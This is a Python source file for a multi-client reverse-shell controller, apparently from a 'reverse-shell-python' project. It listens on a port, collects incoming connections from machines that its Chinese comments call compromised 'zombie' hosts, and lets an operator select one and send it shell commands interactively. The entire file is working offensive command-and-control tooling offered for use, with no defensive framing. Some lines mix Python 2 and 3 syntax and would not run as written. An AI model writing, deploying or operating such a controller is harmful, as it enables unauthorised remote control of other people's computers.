#!/usr/bin/env python
# -*- coding: utf-8 -*-
# reverse_servers.py
# reverse-shell-python
# http://malu.me
# Version 2.0

import sys, os, os.path
import socket 
import time
import threading
import signal

def isset(v): 
    try : 
        type (eval(v)) 
    except : 
        return 0
    else :
        return 1

def quit(signum, frame):
    print('You choose to stop me.')
    sys.exit()

clientList = []
curClient = None

class ReverseShellServer:
    
    host = ''
    port = None
    s = None
    max_bind_retries = 10
    conn = None
    addr = None
    hostname = None
    
    def create(self, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.port = port

    def bind(self, current_try=0):
        try:
            print("listening on port %s (attempt %d)" % (self.port, current_try))
            self.s.bind((self.host, self.port))
            self.s.listen(1024)
        except socket.error as msg:
            print >> sys.stderr, 'socket binding error:', msg[0]
            if current_try < self.max_bind_retries: 
                print >> sys.stderr, 'retrying...'
                self.bind(current_try + 1)

    def menu(self):
        thread_A = threading.Thread(target=self.wait_connect)
        thread_A.setDaemon(True)
        thread_A.start()
        self.ch_input()
        while True:
            pass

    def wait_connect(self):
        global clientList
        while True:
            if len(clientList) == 0:
                print('Waiting for the connection......')
            sock, addr = self.s.accept()
            sock.setblocking(0)
            sock.settimeout(0.01)
            print('New client %s:%s is connection!' % (addr[0],addr[1]))
            clientList.append((sock, addr))
            #print clientList

    def ch_input(self):
        global clientList
        while True:
            ch_cmd = input("")
            if ch_cmd == '!ch':                    #切换肉机指令
                self.select_client()
                return
            if 0 == len(clientList):
                print('Waiting for the connection......')
            else:
                print('Please input "!ch" to select a client')

    def select_client(self):        #选择客户端
        global clientList
        global curClient
    
        for i in range(len(clientList)):    #输出已经连接到控制端的肉机地址
            print('[%i]-> %s' % (i, str(clientList[i][1][0])))
        print('Please select a client!')
    
        while True:
            try:
                num = int(input('Client num (Default [0]):'))      #等待输入一个待选择地址的序号
            except:
                num = 0
            if num >= len(clientList):
                print('Please input a correct num!')
                continue
            else:
                break
    
        curClient = clientList[int(num)]    #将选择的socket对象存入curClient中
        self.conn = curClient[0]
        self.addr = curClient[1]
        thread_B = threading.Thread(target=self.menu_recv)    #接收子线程
        thread_B.setDaemon(True)
        thread_B.start()
        thread_C = threading.Thread(target=self.menu_input)    #输入子线程
        thread_C.setDaemon(True)
        thread_C.start()

    def menu_recv(self):
        while True:
            try:
                data = self.conn.recv(16834)
            except socket.error as msg:
                msg
                data = None
            if data:
                sys.stdout.write(data)    #无缓冲输出
                sys.stdout.flush()

    def menu_input(self):
        while True:
            cmd = input("")
            if cmd == '!ch':                    #切换肉机指令
                self.select_client()
                command = self.conn.send("\n")
                return
            cmd += "\n"
            command = self.conn.send(cmd)


def main(args):
    signal.signal(signal.SIGINT, quit)
    signal.signal(signal.SIGTERM, quit)

    server = ReverseShellServer()
    server.create(args.port)
    server.bind()
    server.menu()
    print('[*] returned from socketAccept')
    return 0

if __name__ == '__main__':
    from argparse import ArgumentParser
    p = ArgumentParser()
    p.add_argument('--port', '-p', type=int, default=9300)
    args = p.parse_args()
    code = main(args)
    exit(code)
